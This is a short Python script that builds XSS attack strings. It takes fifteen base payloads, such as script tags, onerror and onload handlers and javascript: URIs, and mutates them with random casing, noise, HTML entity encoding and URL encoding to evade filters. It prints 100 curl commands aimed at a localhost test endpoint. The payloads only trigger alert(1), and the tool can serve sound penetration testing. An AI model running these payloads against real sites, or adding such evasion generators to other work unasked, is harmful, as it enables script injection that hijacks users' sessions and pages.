import random
import urllib.parse
import html

TARGET = "http://localhost/test?input="

BASE_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "data:text/html,<script>alert(1)</script>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<math href=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
]

def random_case(s):
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def insert_noise(s):
    s = s.replace("=", random.choice(["=", " = ", "  ="]))
    s = s.replace("alert", random.choice(["alert", "alert ", " alert"]))
    return s

def html_entity_encode(s):
    return html.escape(s)

def url_encode(s, rounds=1):
    for _ in range(rounds):
        s = urllib.parse.quote(s)
    return s

def double_wrap(s):
    wrappers = [
        lambda x: f"test{x}",
        lambda x: f"{x}test",
        lambda x: f"abc{x}123",
    ]
    return random.choice(wrappers)(s)

def mutate(payload):
    p = payload

    if random.random() > 0.3:
        p = random_case(p)

    if random.random() > 0.5:
        p = insert_noise(p)

    if random.random() > 0.6:
        p = html_entity_encode(p)

    if random.random() > 0.4:
        rounds = random.choice([1, 2])
        p = url_encode(p, rounds)

    if random.random() > 0.5:
        p = double_wrap(p)

    return p

generated = set()

while len(generated) < 100:
    base = random.choice(BASE_PAYLOADS)
    mutated = mutate(base)
    curl_cmd = f'curl "{TARGET}{mutated}"'
    generated.add(curl_cmd)

for cmd in generated:
    print(cmd)
